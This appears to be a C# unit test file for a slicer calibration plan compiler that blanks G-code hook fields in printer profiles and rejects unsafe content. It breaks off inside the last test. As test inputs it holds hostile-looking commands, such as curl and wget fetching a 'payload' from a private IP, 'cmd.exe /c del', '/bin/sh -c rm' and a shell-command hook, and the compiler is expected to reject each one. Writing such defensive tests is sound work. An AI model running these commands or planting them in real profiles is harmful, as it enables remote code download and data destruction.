using System.Text.Json;
using Farm.Web.Api.Services.Calibration.Generation;
using FluentAssertions;

namespace Farm.Web.Api.Tests.Services.Calibration.Generation;

/// <summary>
/// Adversarial tests for the upstream-Orca plan compiler.
/// </summary>
public sealed class OrcaCalibrationPlanCompilerTests
{
    private static (CalibrationSpecification Specification, CalibrationValidatedModel Model)
        Prepare(CalibrationGenerationContext? context = null)
    {
        CalibrationSpecification specification = CalibrationGenerationTestData.Compiler()
            .Compile(
                context ?? CalibrationGenerationTestData.Context(),
                new TemperatureCalibrationOptions())
            .Value!;
        CalibrationValidatedModel model = new CalibrationModelValidator()
            .ValidateGeneratedGeometryAsync(
                new CalibrationGeneratedGeometry(
                    CalibrationGenerationPipeline.ModelContent,
                    "calibration-body.stl"),
                specification,
                CancellationToken.None)
            .GetAwaiter()
            .GetResult()
            .Value!;
        return (specification, model);
    }

    private static IReadOnlyList<string> Codes(
        CalibrationGenerationResult<OrcaCalibrationPlan> result) =>
        result.Problems.Select(problem => problem.Code).ToArray();

    [Fact]
    public void Compile_WithVerifiedProfiles_KeepsTheExactBaselineAndItsDigestUntouched()
    {
        (CalibrationSpecification specification, CalibrationValidatedModel model) = Prepare();

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = result.Problems.Should().BeEmpty();
        _ = result.Value!.MachineProfile.SourceExactJson.Should()
            .Be(specification.Document.Profiles.Machine!.ExactJson);
        _ = result.Value.ProcessProfile.SourceExactJson.Should()
            .Be(specification.Document.Profiles.Process!.ExactJson);
        _ = result.Value.FilamentProfile.SourceExactJson.Should()
            .Be(specification.Document.Profiles.Filament!.ExactJson);
        _ = result.Value.MachineProfile.SourceSha256.Should()
            .Be(specification.Document.Profiles.Machine.Sha256);
        _ = result.Value.ProcessProfile.SourceSha256.Should()
            .Be(specification.Document.Profiles.Process.Sha256);
        _ = result.Value.FilamentProfile.SourceSha256.Should()
            .Be(specification.Document.Profiles.Filament.Sha256);
        _ = result.Value.ManifestSha256.Should()
            .Be(CalibrationCanonicalJson.ComputeTextSha256(result.Value.ManifestJson));
    }

    [Fact]
    public void Compile_WithProfilesThatDeclareNoForbiddenKey_NeutralizesNothing()
    {
        (CalibrationSpecification specification, CalibrationValidatedModel model) = Prepare();

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = result.Problems.Should().BeEmpty();
        foreach (OrcaPlanProfile profile in Profiles(result.Value!))
        {
            _ = profile.NeutralizedKeys.Should().BeEmpty();
            _ = profile.EffectiveSha256.Should()
                .Be(CalibrationCanonicalJson.ComputeTextSha256(profile.EffectiveJson));
            _ = JsonEquivalent(profile.EffectiveJson, profile.SourceExactJson).Should().BeTrue();
        }
    }

    [Theory]
    [InlineData("machine_start_gcode")]
    [InlineData("machine_end_gcode")]
    [InlineData("layer_change_gcode")]
    [InlineData("before_layer_change_gcode")]
    [InlineData("change_filament_gcode")]
    [InlineData("template_custom_gcode")]
    [InlineData("printer_notes")]
    public void Compile_WithProfileCarryingCommandField_NeutralizesItWithoutTouchingTheBaseline(
        string key)
    {
        const string payload = "G28 ; then something else";
        string machineJson =
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"" + key +
            "\":\"" + payload + "\"}";
        CalibrationGenerationContext context = ContextWithMachineProfile(machineJson);

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = result.Problems.Should().BeEmpty();
        OrcaPlanProfile machine = result.Value!.MachineProfile;

        // The baseline is provenance: it still carries the original bytes and the original digest.
        _ = machine.SourceExactJson.Should().Be(machineJson);
        _ = machine.SourceSha256.Should()
            .Be(CalibrationCanonicalJson.ComputeTextSha256(machineJson));

        // The effective document keeps the key but never its value.
        _ = machine.NeutralizedKeys.Should().Equal(key);
        _ = machine.EffectiveJson.Should().NotContain(payload);
        _ = machine.EffectiveJson.Should().Contain($"\"{key}\":\"\"");
        _ = machine.EffectiveSha256.Should()
            .Be(CalibrationCanonicalJson.ComputeTextSha256(machine.EffectiveJson));
        _ = machine.EffectiveSha256.Should().NotBe(machine.SourceSha256);

        // The manifest records both digests plus the neutralization, so lineage stays complete.
        OrcaPlanProfileReference reference = result.Value.Manifest.Machine;
        _ = reference.SourceSha256.Should().Be(machine.SourceSha256);
        _ = reference.EffectiveSha256.Should().Be(machine.EffectiveSha256);
        _ = reference.NeutralizedKeys.Should().Equal(key);
        _ = result.Value.ManifestJson.Should().NotContain(payload);
    }

    [Fact]
    public void Compile_WithProfileCarryingSeveralCommandFields_RecordsThemInFixedOrder()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"template_custom_gcode\":\"M117 last\",\"name\":\"PF Machine\"," +
            "\"printer_notes\":\"PRINTER_MODEL_PF\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"machine_start_gcode\":\"G28\",\"post_process\":[]}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = result.Problems.Should().BeEmpty();
        OrcaPlanProfile machine = result.Value!.MachineProfile;
        _ = machine.NeutralizedKeys.Should().Equal(
            "machine_start_gcode",
            "post_process",
            "printer_notes",
            "template_custom_gcode");
        _ = machine.EffectiveJson.Should().NotContain("M117 last");
        _ = machine.EffectiveJson.Should().NotContain("PRINTER_MODEL_PF");
        _ = machine.EffectiveJson.Should().NotContain("G28");
        _ = machine.EffectiveJson.Should().Contain("\"post_process\":[]");
        _ = machine.EffectiveJson.Should().Contain("\"nozzle_diameter\":[\"0.4\"]");
    }

    [Theory]
    [InlineData("machine_pause_gcode")]
    [InlineData("time_lapse_gcode")]
    [InlineData("printing_by_object_gcode")]
    [InlineData("change_extrusion_role_gcode")]
    [InlineData("filament_start_gcode")]
    [InlineData("filament_end_gcode")]
    [InlineData("vendor_magic_gcode")]
    [InlineData("Vendor_Magic_GCODE")]
    public void Compile_WithAnyCustomGcodeHookKey_NeutralizesItEvenWhenThisBuildHasNeverSeenIt(
        string key)
    {
        const string payload = "M117 hello ; then something else";
        string machineJson =
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"" + key +
            "\":\"" + payload + "\"}";

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            Compile(ContextWithMachineProfile(machineJson));

        _ = result.Problems.Should().BeEmpty();
        OrcaPlanProfile machine = result.Value!.MachineProfile;
        _ = machine.SourceExactJson.Should().Be(machineJson);
        _ = machine.NeutralizedKeys.Should().Equal(key);
        _ = machine.EffectiveJson.Should().NotContain(payload);
        _ = machine.EffectiveJson.Should().Contain($"\"{key}\":\"\"");
        _ = result.Value.Manifest.Machine.NeutralizedKeys.Should().Equal(key);
        _ = result.Value.ManifestJson.Should().NotContain(payload);
    }

    [Fact]
    public void Compile_WithManyCustomGcodeHooks_LeavesNoCommandKeyCarryingAValue()
    {
        CalibrationGenerationResult<OrcaCalibrationPlan> result = Compile(ContextWithMachineProfile(
            "{\"time_lapse_gcode\":\"M900\",\"machine_pause_gcode\":\"M601\"," +
            "\"printing_by_object_gcode\":\"M118 object\",\"name\":\"PF Machine\"," +
            "\"change_extrusion_role_gcode\":\"M117 role\",\"filament_start_gcode\":[\"M104 S1\"]," +
            "\"filament_end_gcode\":[\"M104 S0\"],\"vendor_magic_gcode\":\"M999 vendor\"," +
            "\"printer_notes\":\"PRINTER_MODEL_PF\",\"post_process\":[]," +
            "\"nozzle_diameter\":[\"0.4\"]}"));

        _ = result.Problems.Should().BeEmpty();
        OrcaPlanProfile machine = result.Value!.MachineProfile;

        // Every recorded name is a real key of the baseline, and the list is ordinal.
        _ = machine.NeutralizedKeys.Should().Equal(
            "change_extrusion_role_gcode",
            "filament_end_gcode",
            "filament_start_gcode",
            "machine_pause_gcode",
            "post_process",
            "printer_notes",
            "printing_by_object_gcode",
            "time_lapse_gcode",
            "vendor_magic_gcode");
        _ = machine.NeutralizedKeys.Should().BeInAscendingOrder(StringComparer.Ordinal);

        // No key that can carry a command survives with a value, known to this build or not.
        using JsonDocument effective = JsonDocument.Parse(machine.EffectiveJson);
        foreach (JsonProperty property in effective.RootElement.EnumerateObject())
        {
            if (!property.Name.EndsWith("_gcode", StringComparison.OrdinalIgnoreCase) &&
                property.Name is not ("post_process" or "printer_notes"))
            {
                continue;
            }

            bool emptied = property.Value.ValueKind switch
            {
                JsonValueKind.String => property.Value.GetString()!.Length == 0,
                JsonValueKind.Array => property.Value.GetArrayLength() == 0,
                _ => false,
            };
            _ = emptied.Should().BeTrue($"'{property.Name}' must not reach a worker with a value");
        }

        _ = machine.EffectiveJson.Should().NotContain("M900");
        _ = machine.EffectiveJson.Should().NotContain("M601");
        _ = machine.EffectiveJson.Should().NotContain("M999");
        _ = machine.EffectiveJson.Should().NotContain("PRINTER_MODEL_PF");
        _ = machine.EffectiveJson.Should().Contain("\"nozzle_diameter\":[\"0.4\"]");
    }

    [Theory]
    [InlineData(
        "\"machine_start_gcode\":\"G28\\nRUN_SHELL_COMMAND CMD=backup\"",
        "profile_contains_unsafe_command")]
    [InlineData(
        "\"vendor_magic_gcode\":\"curl http://10.0.0.9/payload\"",
        "profile_contains_private_url")]
    [InlineData(
        "\"time_lapse_gcode\":\"M240 ; see http://printer.local/hook\"",
        "profile_contains_private_url")]
    [InlineData("\"filament_start_gcode\":[\"cmd.exe /c del\"]", "profile_contains_unsafe_command")]
    [InlineData("\"printer_notes\":\"C:\\\\secrets\\\\key.txt\"", "profile_contains_filesystem_path")]
    [InlineData("\"post_process\":[\"wget http://10.0.0.9/x\"]", "profile_contains_unsafe_command")]
    [InlineData("\"vendor_shell_gcode\":[\"/bin/sh -c rm\"]", "profile_contains_filesystem_path")]
    [InlineData("\"api_key\":\"s3cr3t\"", "profile_contains_credential")]
    public void Compile_WithUnsafeContentInACommandField_RejectsBeforeAnythingIsNeutralized(
        string member,
        string expectedCode)
    {
        CalibrationGenerationResult<OrcaCalibrationPlan> result = Compile(ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," + member + "}"));

        _ = Codes(result).Should().Contain(expectedCode);
        _ = result.Value.Should().BeNull();
    }

    [Fact]
    public void Compile_ForTheSameInputs_ProducesIdenticalEffectiveDocumentsAndDigests()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"machine_start_gcode\":\"G28\\nM104 S200\",\"printer_notes\":\"notes\"}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        OrcaCalibrationPlan first =
            new OrcaCalibrationPlanCompiler().Compile(specification, model).Value!;
        OrcaCalibrationPlan second =
            new OrcaCalibrationPlanCompiler().Compile(specification, model).Value!;

        _ = second.MachineProfile.EffectiveJson.Should().Be(first.MachineProfile.EffectiveJson);
        _ = second.MachineProfile.EffectiveSha256.Should().Be(first.MachineProfile.EffectiveSha256);
        _ = second.MachineProfile.NeutralizedKeys.Should()
            .Equal(first.MachineProfile.NeutralizedKeys);
        _ = second.ManifestSha256.Should().Be(first.ManifestSha256);
    }

    [Fact]
    public void Compile_ForDocumentsThatDifferOnlyInMemberOrder_ProducesTheSameEffectiveDigest()
    {
        CalibrationGenerationResult<OrcaCalibrationPlan> ordered = Compile(ContextWithMachineProfile(
            "{\"machine_start_gcode\":\"G28\",\"name\":\"PF Machine\"," +
            "\"nozzle_diameter\":[\"0.4\"]}"));
        CalibrationGenerationResult<OrcaCalibrationPlan> reordered = Compile(ContextWithMachineProfile(
            "{\"nozzle_diameter\":[\"0.4\"],\"machine_start_gcode\":\"G28\"," +
            "\"name\":\"PF Machine\"}"));

        _ = ordered.Problems.Should().BeEmpty();
        _ = reordered.Problems.Should().BeEmpty();
        _ = reordered.Value!.MachineProfile.EffectiveSha256.Should()
            .Be(ordered.Value!.MachineProfile.EffectiveSha256);
        _ = reordered.Value.MachineProfile.SourceSha256.Should()
            .NotBe(ordered.Value.MachineProfile.SourceSha256);
    }

    [Fact]
    public void Compile_WithProfileCarryingNonTextCommandField_RemovesTheKeyEntirely()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"machine_start_gcode\":{\"nested\":\"G28\"}}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = result.Problems.Should().BeEmpty();
        OrcaPlanProfile machine = result.Value!.MachineProfile;
        _ = machine.NeutralizedKeys.Should().Equal("machine_start_gcode");
        _ = machine.EffectiveJson.Should().NotContain("machine_start_gcode");
        _ = machine.EffectiveJson.Should().NotContain("G28");
    }

    [Theory]
    [InlineData("1e999")]
    [InlineData("-1e999")]
    [InlineData("99999999999999999999")]
    [InlineData("0.12345678901234567890123456789")]
    [InlineData("1E+2")]
    [InlineData("0.10000000000000000555")]
    [InlineData("1e-999")]
    public void Compile_WithAnExoticNumericToken_CopiesItVerbatimInsteadOfReformattingIt(
        string token)
    {
        CalibrationGenerationResult<OrcaCalibrationPlan> result = Compile(ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"vendor_value\":" +
            token + "}"));

        // A number wider than a double, or out of its range entirely, is neither a server fault nor
        // a rejection: the token the vendor wrote is what the worker is handed back.
        _ = result.Problems.Should().BeEmpty();
        _ = result.Value!.MachineProfile.EffectiveJson.Should().Contain($"\"vendor_value\":{token}");
        _ = result.Value.MachineProfile.EffectiveSha256.Should()
            .Be(CalibrationCanonicalJson.ComputeTextSha256(result.Value.MachineProfile.EffectiveJson));
    }

    [Fact]
    public void Compile_WithNestedExoticNumbers_PreservesEveryTokenAtEveryDepth()
    {
        CalibrationGenerationResult<OrcaCalibrationPlan> result = Compile(ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"vendor_limits\":{\"high\":1e999,\"wide\":99999999999999999999," +
            "\"precise\":0.12345678901234567890123456789}," +
            "\"vendor_series\":[1e999,-0.00000000000000000001,42]}"));

        _ = result.Problems.Should().BeEmpty();
        string effective = result.Value!.MachineProfile.EffectiveJson;
        _ = effective.Should().Contain("\"high\":1e999");
        _ = effective.Should().Contain("\"wide\":99999999999999999999");
        _ = effective.Should().Contain("\"precise\":0.12345678901234567890123456789");
        _ = effective.Should().Contain("[1e999,-0.00000000000000000001,42]");
        _ = effective.Should().NotContain("Infinity");
        _ = effective.Should().NotContain("1E+20");
    }

    [Fact]
    public void Compile_WithNestedObjects_OrdersEveryMemberOrdinallyAtEveryDepth()
    {
        CalibrationGenerationResult<OrcaCalibrationPlan> result = Compile(ContextWithMachineProfile(
            "{\"nozzle_diameter\":[\"0.4\"],\"name\":\"PF Machine\"," +
            "\"vendor_block\":{\"zulu\":1,\"Alpha\":2,\"alpha\":3,\"_leading\":4}," +
            "\"vendor_series\":[{\"beta\":true,\"alpha\":null}]}"));

        _ = result.Problems.Should().BeEmpty();
        string effective = result.Value!.MachineProfile.EffectiveJson;

        // Ordinal ordering is by code unit, so uppercase sorts before lowercase and array element
        // order is preserved because it is part of the document's meaning.
        _ = effective.Should()
            .Contain("\"vendor_block\":{\"Alpha\":2,\"_leading\":4,\"alpha\":3,\"zulu\":1}");
        _ = effective.Should().Contain("\"vendor_series\":[{\"alpha\":null,\"beta\":true}]");
        _ = effective.IndexOf("\"name\"", StringComparison.Ordinal).Should()
            .BeLessThan(effective.IndexOf("\"nozzle_diameter\"", StringComparison.Ordinal));
    }

    [Fact]
    public void Derive_WithAnExoticNumericToken_NeverThrowsAndNeverConvertsThroughADouble()
    {
        OrcaEffectiveProfileDocument effective = OrcaEffectiveProfileFactory.Derive(
            "{\"b\":1e999,\"a\":99999999999999999999,\"machine_start_gcode\":\"G28\"}");

        _ = effective.Json.Should().Be(
            "{\"a\":99999999999999999999,\"b\":1e999,\"machine_start_gcode\":\"\"}");
        _ = effective.NeutralizedKeys.Should().Equal("machine_start_gcode");
        _ = effective.Sha256.Should().Be(CalibrationCanonicalJson.ComputeTextSha256(effective.Json));
    }

    [Fact]
    public void Derive_WithADocumentThatIsNotAJsonObject_ThrowsTheFailureTheCompilerReports()
    {
        // The compiler catches exactly these two failures and reports plan_profile_json_invalid
        // rather than letting a malformed third-party document surface as a server fault.
        _ = FluentActions.Invoking(() => OrcaEffectiveProfileFactory.Derive("[1,2,3]"))
            .Should().Throw<ArgumentException>();
        _ = FluentActions.Invoking(() => OrcaEffectiveProfileFactory.Derive("{\"a\":"))
            .Should().Throw<JsonException>();
    }

    [Fact]
    public void Compile_ProducesOverridesOrderedByKeyForDeterministicManifests()
    {
        (CalibrationSpecification specification, CalibrationValidatedModel model) = Prepare();

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = result.Problems.Should().BeEmpty();
        IReadOnlyList<OrcaSettingOverride> overrides = result.Value!.Manifest.Overrides;
        _ = overrides.Select(setting => setting.Key).Should()
            .BeInAscendingOrder(StringComparer.Ordinal);
        _ = overrides.Should().OnlyContain(
            setting => OrcaCalibrationPlanCompiler.AllowedOverrideKeys.Contains(setting.Key));
    }

    [Fact]
    public void Compile_WithMachineProfileNozzleMismatch_Rejects()
    {
        CalibrationGenerationContext baseline = CalibrationGenerationTestData.Context();
        string mismatched = CalibrationGenerationTestData.MachineProfileJson(0.8m);
        CalibrationGenerationContext context = baseline with
        {
            Profiles = new CalibrationProfileTriplet(
                CalibrationGenerationTestData.Profile(
                    CalibrationGenerationTestData.MachineProfileId,
                    "machine",
                    "PF Machine",
                    mismatched),
                baseline.Profiles.Process,
                baseline.Profiles.Filament),
        };

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("plan_nozzle_mismatch");
    }

    [Fact]
    public void Compile_WithProfileDeclaringInheritance_Rejects()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"inherits\":\"Generic Klipper\"," +
            "\"nozzle_diameter\":[\"0.4\"]}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("plan_profile_inheritance_unsupported");
    }

    [Theory]
    [InlineData("machine_start_gcode")]
    [InlineData("machine_end_gcode")]
    [InlineData("layer_change_gcode")]
    public void Compile_WithCommandFieldCarryingAHostCommand_RejectsInsteadOfNeutralizing(string key)
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"" + key +
            "\":\"G28\\nRUN_SHELL_COMMAND CMD=backup\"}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("profile_contains_unsafe_command");
        _ = result.Value.Should().BeNull();
    }

    [Fact]
    public void Compile_WithUnknownSettingCarryingAHostCommand_Rejects()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"vendor_hook\":\"curl http://10.0.0.9/payload\"}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("profile_contains_private_url");
        _ = result.Value.Should().BeNull();
    }

    [Fact]
    public void Compile_WithMalformedProfileJson_Rejects()
    {
        CalibrationGenerationContext baseline = CalibrationGenerationTestData.Context();
        const string malformed = "{\"name\":\"PF Machine\",";
        CalibrationGenerationContext context = baseline with
        {
            Profiles = new CalibrationProfileTriplet(
                new CalibrationExactProfile(
                    CalibrationGenerationTestData.MachineProfileId,
                    "machine",
                    "PF Machine",
                    "1",
                    malformed,
                    CalibrationCanonicalJson.ComputeTextSha256(malformed)),
                baseline.Profiles.Process,
                baseline.Profiles.Filament),
        };

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("profile_json_invalid");
        _ = result.Value.Should().BeNull();
    }

    [Theory]
    [InlineData("post_process")]
    [InlineData("machine_start_gcode")]
    public void Compile_WithProfileCarryingAnEmptyForbiddenField_StillRecordsTheNeutralization(
        string key)
    {
        string empty = string.Equals(key, "post_process", StringComparison.Ordinal) ? "[]" : "\"\"";
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"" + key + "\":" + empty + "}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = result.Problems.Should().BeEmpty();
        _ = result.Value!.MachineProfile.NeutralizedKeys.Should().Equal(key);
    }

    [Fact]
    public void Compile_WithProfileCarryingPostProcessingCommand_Rejects()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"post_process\":[\"/bin/sh -c backup\"]}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("profile_contains_unsafe_command");
    }

    [Fact]
    public void Compile_WithProfileCarryingCredential_Rejects()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"api_key\":\"super-secret-value\"}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("profile_contains_credential");
    }

    [Fact]
    public void Compile_WithProfileCarryingPrivateUrl_Rejects()
    {
        CalibrationGenerationContext context = ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"]," +
            "\"service_url\":\"http://10.0.0.42/api\"}");

        (CalibrationSpecification specification, CalibrationValidatedModel model) =
            Prepare(context);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, model);

        _ = Codes(result).Should().Contain("profile_contains_private_url");
    }

    [Fact]
    public void Compile_WithChangedProfileJsonAfterCompilation_RejectsOnDigestMismatch()
    {
        (CalibrationSpecification specification, CalibrationValidatedModel model) = Prepare();
        CalibrationSpecificationDocument document = specification.Document;
        CalibrationSpecificationDocument tamperedDocument = document with
        {
            Profiles = new CalibrationProfileTriplet(
                document.Profiles.Machine! with
                {
                    ExactJson = document.Profiles.Machine.ExactJson + " ",
                },
                document.Profiles.Process,
                document.Profiles.Filament),
        };
        CalibrationSpecification tampered = new(
            tamperedDocument,
            specification.CanonicalJson,
            specification.Sha256);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(tampered, model);

        _ = Codes(result).Should().Contain("profile_hash_mismatch");
    }

    [Fact]
    public void Compile_WithSpecificationDigestThatDoesNotMatchItsJson_Rejects()
    {
        (CalibrationSpecification specification, CalibrationValidatedModel model) = Prepare();
        CalibrationSpecification tampered = new(
            specification.Document,
            specification.CanonicalJson,
            new string('e', 64));

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(tampered, model);

        _ = Codes(result).Should().Contain("specification_hash_mismatch");
    }

    [Fact]
    public void Compile_WithValidatedModelThatIsNotTheLinkedAsset_Rejects()
    {
        CalibrationSpecification specification = CalibrationGenerationPipeline
            .CompileSpecification(CalibrationMethod.FinalVerification).Value!;
        CalibrationValidatedModel wrongModel = new(
            Guid.NewGuid(),
            new string('f', 64),
            CalibrationModelFormats.Stl,
            "other.stl",
            128,
            "imported",
            1,
            4,
            new CalibrationModelBounds(0m, 0m, 0m, 10m, 10m, 10m),
            "millimeter");

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(specification, wrongModel);

        _ = Codes(result).Should().Contain("plan_model_mismatch");
    }

    [Fact]
    public void Compile_WithUnsupportedDistribution_RejectsBeforeProducingAnyOverride()
    {
        CalibrationGenerationContext baseline = CalibrationGenerationTestData.Context();
        (CalibrationSpecification specification, CalibrationValidatedModel model) = Prepare();
        CalibrationSpecificationDocument tamperedDocument = specification.Document with
        {
            Compatibility = baseline.Compatibility with { SlicerDistribution = "vendor-fork" },
        };
        CalibrationSpecification tampered = new(
            tamperedDocument,
            specification.CanonicalJson,
            specification.Sha256);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(tampered, model);

        _ = Codes(result).Should().Contain("slicer_distribution_unsupported");
        _ = result.Value.Should().BeNull();
    }

    [Fact]
    public void Compile_WithMissingContainerDigest_ReturnsExplicitDependencyError()
    {
        CalibrationGenerationContext baseline = CalibrationGenerationTestData.Context();
        (CalibrationSpecification specification, CalibrationValidatedModel model) = Prepare();
        CalibrationSpecificationDocument tamperedDocument = specification.Document with
        {
            Compatibility = baseline.Compatibility with { SlicerContainerDigest = null },
        };
        CalibrationSpecification tampered = new(
            tamperedDocument,
            specification.CanonicalJson,
            specification.Sha256);

        CalibrationGenerationResult<OrcaCalibrationPlan> result =
            new OrcaCalibrationPlanCompiler().Compile(tampered, model);

        _ = Codes(result).Should().Contain("slicer_container_digest_missing");
        _ = result.Value.Should().BeNull();
    }

    [Fact]
    public void Compile_WritesTheCurrentManifestSchemaWithBothDigestsAndTheNeutralizationRecord()
    {
        CalibrationGenerationResult<OrcaCalibrationPlan> result = Compile(ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"machine_start_gcode\":\"G28\"}"));

        _ = result.Problems.Should().BeEmpty();
        OrcaCalibrationPlan plan = result.Value!;
        _ = plan.Manifest.SchemaVersion.Should().Be(OrcaCalibrationPlanManifestSchema.Current);
        _ = plan.Manifest.SchemaVersion.Should().Be("1.1");
        _ = plan.ManifestJson.Should().Contain("\"schemaVersion\":\"1.1\"");
        _ = plan.ManifestJson.Should().Contain("\"sourceSha256\"");
        _ = plan.ManifestJson.Should().Contain("\"effectiveSha256\"");
        _ = plan.ManifestJson.Should().Contain("\"neutralizedKeys\":[\"machine_start_gcode\"]");
        _ = plan.ManifestSha256.Should()
            .Be(CalibrationCanonicalJson.ComputeTextSha256(plan.ManifestJson));
    }

    [Fact]
    public void Serialize_ForTheSupersededSchema_ReproducesTheSinglePerProfileBaselineDigest()
    {
        OrcaCalibrationPlan plan = Compile(ContextWithMachineProfile(
            "{\"name\":\"PF Machine\",\"nozzle_diameter\":[\"0.4\"],\"machine_start_gcode\":\"G28\"}"))
            .Value!;

        string legacy = OrcaCalibrationPlanManifestSchema.Serialize(
            plan.Manifest,
            OrcaCalibrationPlanManifestSchema.SingleProfileDigest);

        _ = legacy.Should().Contain("\"schemaVersion\":\"1.0\"");
        _ = legacy.Should().Contain($"\"sha256\":\"{plan.MachineProfile.SourceSha256}\"");
        _ = legacy.Should().NotContain("sourceSha256");
        _ = legacy.Should().NotContain("effectiveSha256");
        _ = legacy.Should().NotContain("neutralizedKeys");
        _ = legacy.Should().NotContain(plan.MachineProfile.EffectiveSha256);

        // The frozen body must differ from the current one in exactly the two places the schema
        // changed, so a later edit to the current manifest cannot silently rewrite history.
        using JsonDocument current = JsonDocument.Parse(plan.ManifestJson);
        using JsonDocument superseded = JsonDocument.Parse(legacy);
        _ = superseded.RootElement.EnumerateObject().Select(member => member.Name).Should()
            .Equal(current.RootElement.EnumerateObject().Select(member => member.Name));
        foreach (JsonProperty member in current.RootElement.EnumerateObject())
        {
            if (member.Name is "schemaVersion" or "machine" or "process" or "filament")
            {
                continue;
            }

            _ = superseded.RootElement.GetProperty(member.Name).GetRawText().Should()
                .Be(member.Value.GetRawText());
        }

        _ = superseded.RootElement.GetProperty("machine").GetRawText().Should().Be(
            $"{{\"id\":\"{plan.MachineProfile.Id}\",\"revision\":\"{plan.MachineProfile.Revision}\"," +
            $"\"sha256\":\"{plan.MachineProfile.SourceSha256}\"}}");
    }

    [Fact]
    public void Serialize_ForAVersionThisBuildDoesNotWrite_Throws()
    {
        OrcaCalibrationPlan plan = Compile(CalibrationGenerationTestData.Context()).Value!;

        _ = FluentActions
            .Invoking(() => OrcaCalibrationPlanManifestSchema.Serialize(plan.Manifest, "9.9"))
            .Should().Throw<ArgumentOutOfRangeException>();
    }

    [Fact]
    public void BindToCheckpoint_WithASupersededSchemaDigest_ReturnsThatManifestIdentity()
    {
        OrcaCalibrationPlan plan = Compile(ContextWithMachineProfile(
